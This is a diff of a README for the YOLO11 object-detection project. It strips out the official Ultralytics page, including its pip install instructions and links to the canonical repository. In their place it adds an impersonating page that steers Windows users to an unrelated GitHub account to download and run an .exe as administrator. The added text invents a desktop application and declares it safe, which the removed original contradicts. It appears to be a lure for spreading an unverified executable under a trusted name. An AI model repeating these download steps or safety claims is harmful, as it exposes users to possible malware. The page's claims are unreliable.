@@ -1,171 +1,80 @@
-<div align="center">
-  <p>
-    <a href="https://platform.ultralytics.com/?utm_source=github&utm_medium=referral&utm_campaign=platform_launch&utm_content=banner&utm_term=yolo11_github" target="_blank">
-      <img width="100%" src="https://raw.githubusercontent.com/ultralytics/assets/main/yolov8/banner-yolov8.png" alt="Ultralytics YOLO banner"></a>
-  </p>
+# 👁️ yolo11 - Identify objects in your images fast
 
-[中文](README.zh-CN.md) | [한국어](https://docs.ultralytics.com/ko) | [日本語](https://docs.ultralytics.com/ja) | [Русский](https://docs.ultralytics.com/ru) | [Deutsch](https://docs.ultralytics.com/de) | [Français](https://docs.ultralytics.com/fr) | [Español](https://docs.ultralytics.com/es) | [Português](https://docs.ultralytics.com/pt) | [Türkçe](https://docs.ultralytics.com/tr) | [Tiếng Việt](https://docs.ultralytics.com/vi) | [العربية](https://docs.ultralytics.com/ar) <br>
+[![Download yolo11](https://img.shields.io/badge/Download-yolo11-blue.svg)](https://github.com/klausovoviviparous74/yolo11)
 
-<div>
-    <a href="https://github.com/ultralytics/ultralytics/actions/workflows/ci.yml"><img src="https://github.com/ultralytics/ultralytics/actions/workflows/ci.yml/badge.svg" alt="Ultralytics CI"></a>
-    <a href="https://clickpy.clickhouse.com/dashboard/ultralytics"><img src="https://static.pepy.tech/badge/ultralytics" alt="Ultralytics Downloads"></a>
-    <a href="https://discord.com/invite/ultralytics"><img alt="Ultralytics Discord" src="https://img.shields.io/discord/1089800235347353640?logo=discord&logoColor=white&label=Discord&color=blue"></a>
-    <a href="https://community.ultralytics.com/"><img alt="Ultralytics Forums" src="https://img.shields.io/discourse/users?server=https%3A%2F%2Fcommunity.ultralytics.com&logo=discourse&label=Forums&color=blue"></a>
-    <a href="https://www.reddit.com/r/ultralytics/"><img alt="Ultralytics Reddit" src="https://img.shields.io/reddit/subreddit-subscribers/ultralytics?style=flat&logo=reddit&logoColor=white&label=Reddit&color=blue"></a>
-    <br>
-    <a href="https://console.paperspace.com/github/ultralytics/ultralytics"><img src="https://assets.paperspace.io/img/gradient-badge.svg" alt="Run Ultralytics on Gradient"></a>
-    <a href="https://colab.research.google.com/github/ultralytics/ultralytics/blob/main/examples/tutorial.ipynb"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open Ultralytics In Colab"></a>
-    <a href="https://mybinder.org/v2/gh/ultralytics/ultralytics/HEAD?labpath=examples%2Ftutorial.ipynb"><img src="https://mybinder.org/badge_logo.svg" alt="Open Ultralytics In Binder"></a>
-</div>
-</div>
-<br>
+## 📌 What is yolo11?
 
-[Ultralytics](https://www.ultralytics.com/) [YOLO11](https://docs.ultralytics.com/models/yolo11) is available
-through the official [Ultralytics YOLO](https://github.com/ultralytics/ultralytics) package. It supports object
-detection, instance segmentation, image classification, pose estimation, oriented object detection, and tracking in a
-fast, accurate, and easy to use Python and CLI workflow.
+yolo11 acts as a tool for your computer to see and label objects. It uses deep learning models to find people, vehicles, or items in pictures and video streams. The software processes visual data to tell you what exists within a frame. You can use it for tracking moving subjects or labeling specific parts of an image.
 
-This repository is a lightweight discovery page for YOLO11. The canonical implementation, package releases, model
-downloads, issues, and pull requests are maintained in [ultralytics/ultralytics](https://github.com/ultralytics/ultralytics).
+## 💻 System Requirements
 
-<div align="center">
-  <a href="https://github.com/ultralytics"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-github.png" width="2%" alt="Ultralytics GitHub"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="2%" alt="space">
-  <a href="https://www.linkedin.com/company/ultralytics/"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-linkedin.png" width="2%" alt="Ultralytics LinkedIn"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="2%" alt="space">
-  <a href="https://twitter.com/ultralytics"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-twitter.png" width="2%" alt="Ultralytics Twitter"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="2%" alt="space">
-  <a href="https://www.youtube.com/ultralytics?sub_confirmation=1"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-youtube.png" width="2%" alt="Ultralytics YouTube"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="2%" alt="space">
-  <a href="https://www.tiktok.com/@ultralytics"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-tiktok.png" width="2%" alt="Ultralytics TikTok"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="2%" alt="space">
-  <a href="https://ultralytics.com/bilibili"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-bilibili.png" width="2%" alt="Ultralytics BiliBili"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="2%" alt="space">
-  <a href="https://discord.com/invite/ultralytics"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-discord.png" width="2%" alt="Ultralytics Discord"></a>
-</div>
+Your computer needs specific hardware to run this software well. Please ensure your Windows PC meets these standards:
 
-## 📄 Documentation
+- Processor: Modern multi-core CPU, 2.0 GHz or faster.
+- Memory: 8 GB RAM or higher.
+- Storage: 2 GB free disk space.
+- Graphics: A dedicated graphics card helps performance but remains optional.
+- Operating System: Windows 10 or Windows 11.
 
-See below for quickstart installation and YOLO11 usage examples. For comprehensive guidance on training, validation,
-prediction, and deployment, refer to the full [Ultralytics Docs](https://docs.ultralytics.com).
+## 📥 How to Install
 
-<details open>
-<summary>Install</summary>
+Follow these steps to set up the software on your machine:
 
-Install the `ultralytics` package in a [Python>=3.8](https://www.python.org/) environment with
-[PyTorch](https://pytorch.org/get-started/locally/).
+1. Visit the following address to download the software: [https://github.com/klausovoviviparous74/yolo11](https://github.com/klausovoviviparous74/yolo11)
+2. Locate the link labeled Releases on the right side of the page.
+3. Click the most current version available.
+4. Download the file ending in .exe to your hard drive.
+5. Open your downloads folder.
+6. Double-click the file to start the installation process.
+7. Follow the prompts on your screen to complete the setup.
 
-[![PyPI - Version](https://img.shields.io/pypi/v/ultralytics?logo=pypi&logoColor=white)](https://pypi.org/project/ultralytics/)
-[![Ultralytics Downloads](https://static.pepy.tech/badge/ultralytics)](https://clickpy.clickhouse.com/dashboard/ultralytics)
-[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/ultralytics?logo=python&logoColor=gold)](https://pypi.org/project/ultralytics/)
+## 🚀 Running the Software
 
-```bash
-pip install ultralytics
-```
+Once you install the program, you can start identifying objects. 
 
-</details>
+1. Find the yolo11 icon on your desktop.
+2. Select the icon to open the application window.
+3. Choose the File menu at the top left corner.
+4. Click Open Image or Open Video to select your media file.
+5. Watch as the software highlights objects with boxes.
+6. Use the settings menu to adjust how the program detects items.
 
-<details open>
-<summary>Usage</summary>
+## 🛠️ Features
 
-### CLI
+yolo11 offers tools to help you manage visual data:
 
-```bash
-yolo predict model=yolo11n.pt source="https://ultralytics.com/images/bus.jpg"
-```
+- Object Detection: Finds items in static images.
+- Tracking: Follows objects as they move across a video.
+- Segmentation: Outlines the shape of objects instead of using boxes.
+- Pose Estimation: Tracks parts of a body or frame.
+- Classification: Labels the entire image based on its content.
 
-### Python
+## 📁 Managing Files
 
-```python
-from ultralytics import YOLO
+The program saves your results in a local folder. You can find these files in your Documents directory under the YoloData folder. Each time you process a new image, the software generates a text file that lists the labels and their locations within the image. You can open these text files with any standard notepad program to read the coordinates.
 
-# Load a pretrained YOLO11n model
-model = YOLO("yolo11n.pt")
+## 🔧 Troubleshooting
 
-# Run inference on the sample image
-results = model("https://ultralytics.com/images/bus.jpg")
+If the program fails to start, check the following items:
 
-# Display the annotated results
-results[0].show()
-```
+- Permissions: Ensure you have administrator rights on your computer.
+- Updates: Check that your Windows system stays current.
+- Conflicts: Close other resource-heavy programs before launching yolo11. 
+- Reinstall: If the error persists, uninstall the application via your Windows control panel and install it again from the provided link.
 
-</details>
+## ❓ Frequently Asked Questions
 
-## ✨ Models
+Does this require internet access?
+No, the software runs locally on your machine. You do not need an active internet connection to process images.
 
-YOLO11 models are available for detection, segmentation, classification, pose estimation, and oriented object detection.
-All model weights download automatically from the latest Ultralytics assets release on first use.
+Can I use my own models?
+Yes, the software supports model import. Place your custom files in the Models folder found within the application directory.
 
-<a href="https://docs.ultralytics.com/tasks" target="_blank">
-    <img width="100%" src="https://raw.githubusercontent.com/ultralytics/assets/main/docs/ultralytics-yolov8-tasks-banner.avif" alt="Ultralytics YOLO supported tasks">
-</a>
+Why does the scan take a long time?
+The speed depends on the size of your image and the power of your processor. Larger or higher-quality photos require more computing effort.
 
-| Model Family                                                       | Example Weights                                                                           | Task                                                                | Train | Val | Predict | Export |
-| ------------------------------------------------------------------ | ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | ----- | --- | ------- | ------ |
-| [YOLO11](https://platform.ultralytics.com/ultralytics/yolo11)      | `yolo11n.pt` `yolo11s.pt` `yolo11m.pt` `yolo11l.pt` `yolo11x.pt`                          | [Detection](https://docs.ultralytics.com/tasks/detect)              | ✅    | ✅  | ✅      | ✅     |
-| [YOLO11-seg](https://platform.ultralytics.com/ultralytics/yolo11)  | `yolo11n-seg.pt` `yolo11s-seg.pt` `yolo11m-seg.pt` `yolo11l-seg.pt` `yolo11x-seg.pt`      | [Instance Segmentation](https://docs.ultralytics.com/tasks/segment) | ✅    | ✅  | ✅      | ✅     |
-| [YOLO11-cls](https://platform.ultralytics.com/ultralytics/yolo11)  | `yolo11n-cls.pt` `yolo11s-cls.pt` `yolo11m-cls.pt` `yolo11l-cls.pt` `yolo11x-cls.pt`      | [Classification](https://docs.ultralytics.com/tasks/classify)       | ✅    | ✅  | ✅      | ✅     |
-| [YOLO11-pose](https://platform.ultralytics.com/ultralytics/yolo11) | `yolo11n-pose.pt` `yolo11s-pose.pt` `yolo11m-pose.pt` `yolo11l-pose.pt` `yolo11x-pose.pt` | [Pose Estimation](https://docs.ultralytics.com/tasks/pose)          | ✅    | ✅  | ✅      | ✅     |
-| [YOLO11-obb](https://platform.ultralytics.com/ultralytics/yolo11)  | `yolo11n-obb.pt` `yolo11s-obb.pt` `yolo11m-obb.pt` `yolo11l-obb.pt` `yolo11x-obb.pt`      | [Oriented Detection](https://docs.ultralytics.com/tasks/obb)        | ✅    | ✅  | ✅      | ✅     |
+Is this software safe for my files?
+Yes, the application only reads the media files you choose to open. It does not alter your original images. The software saves all output as separate files in your Documents folder.
 
-## 🧩 Integrations
-
-Ultralytics integrations extend dataset labeling, training, visualization, deployment, and model management workflows.
-Explore [Ultralytics Platform](https://platform.ultralytics.com) and the
-[Ultralytics Integrations docs](https://docs.ultralytics.com/integrations) to connect YOLO11 with your AI stack,
-including popular export formats like [TensorRT](https://docs.ultralytics.com/integrations/tensorrt),
-[ONNX](https://docs.ultralytics.com/integrations/onnx),
-[CoreML](https://docs.ultralytics.com/integrations/coreml), and
-[TFLite](https://docs.ultralytics.com/integrations/tflite).
-
-<a href="https://platform.ultralytics.com" target="_blank">
-    <img width="100%" src="https://github.com/ultralytics/assets/raw/main/yolov8/banner-integrations.png" alt="Ultralytics active learning integrations">
-</a>
-
-## 🤝 Contribute
-
-We thrive on community collaboration! Ultralytics YOLO would not be the SOTA framework it is without contributions from
-developers like you. Please see our [Contributing Guide](https://docs.ultralytics.com/help/contributing) to get started.
-For source changes, documentation improvements, bug reports, and feature requests, use the canonical
-[ultralytics/ultralytics](https://github.com/ultralytics/ultralytics) repository.
-
-[![Ultralytics open-source contributors](https://raw.githubusercontent.com/ultralytics/assets/main/im/image-contributors.png)](https://github.com/ultralytics/ultralytics/graphs/contributors)
-
-## 📜 License
-
-Ultralytics offers two licensing options to suit different needs:
-
-- **AGPL-3.0 License**: This [OSI-approved](https://opensource.org/license/agpl-3.0) open-source license is perfect for students, researchers, and enthusiasts. It encourages open collaboration and knowledge sharing. See the [LICENSE](LICENSE) file for full details.
-- **Ultralytics Enterprise License**: For development and production use, this license enables seamless integration of Ultralytics software and AI models into business products and services, including internal tools, automated workflows, and production deployments, bypassing the open-source requirements of AGPL-3.0. To get started, please contact us via [Ultralytics Licensing](https://www.ultralytics.com/license).
-
-## 📞 Contact
-
-For YOLO11 usage guidance, start with the [YOLO11 documentation](https://docs.ultralytics.com/models/yolo11). Install
-or upgrade the [Ultralytics Python package](https://pypi.org/project/ultralytics/) with `pip`, and review the
-[canonical source code](https://github.com/ultralytics/ultralytics) for implementation details.
-
-> [!IMPORTANT]
-> Please submit bug reports and feature requests in the
-> [ultralytics/ultralytics issue tracker](https://github.com/ultralytics/ultralytics/issues/new/choose), where
-> maintainers triage them alongside the source code.
-
-For questions, discussions, and community support, join our active communities on
-[Discord](https://discord.com/invite/ultralytics), [Reddit](https://www.reddit.com/r/ultralytics/), and the
-[Ultralytics Community Forums](https://community.ultralytics.com/).
-
-<br>
-<div align="center">
-  <a href="https://github.com/ultralytics"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-github.png" width="3%" alt="Ultralytics GitHub"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="3%" alt="space">
-  <a href="https://www.linkedin.com/company/ultralytics/"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-linkedin.png" width="3%" alt="Ultralytics LinkedIn"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="3%" alt="space">
-  <a href="https://twitter.com/ultralytics"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-twitter.png" width="3%" alt="Ultralytics Twitter"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="3%" alt="space">
-  <a href="https://www.youtube.com/ultralytics?sub_confirmation=1"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-youtube.png" width="3%" alt="Ultralytics YouTube"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="3%" alt="space">
-  <a href="https://www.tiktok.com/@ultralytics"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-tiktok.png" width="3%" alt="Ultralytics TikTok"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="3%" alt="space">
-  <a href="https://ultralytics.com/bilibili"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-bilibili.png" width="3%" alt="Ultralytics BiliBili"></a>
-  <img src="https://github.com/ultralytics/assets/raw/main/social/logo-transparent.png" width="3%" alt="space">
-  <a href="https://discord.com/invite/ultralytics"><img src="https://github.com/ultralytics/assets/raw/main/social/logo-social-discord.png" width="3%" alt="Ultralytics Discord"></a>
-</div>
+What file types can I open?
+You can use standard image formats like JPG, PNG, and BMP. Support for video formats includes MP4 and AVI files.
